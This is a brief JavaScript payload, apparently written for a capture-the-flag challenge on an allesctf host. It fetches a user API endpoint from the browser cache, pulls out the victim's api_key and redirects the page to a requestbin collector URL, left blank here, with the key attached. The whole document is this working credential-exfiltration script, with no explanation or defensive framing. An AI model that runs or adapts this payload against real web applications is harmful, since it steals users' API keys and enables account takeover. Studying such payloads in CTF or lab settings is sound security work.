let requestbin = "";
fetch("https://api.wimc.ctf.allesctf.net/1.0/user", {
		method:"GET",
		cache:"force-cache"
	}).then(a => a.json()).then(b => 
		document.location.href=requestbin + b["data"]["api_key"]);
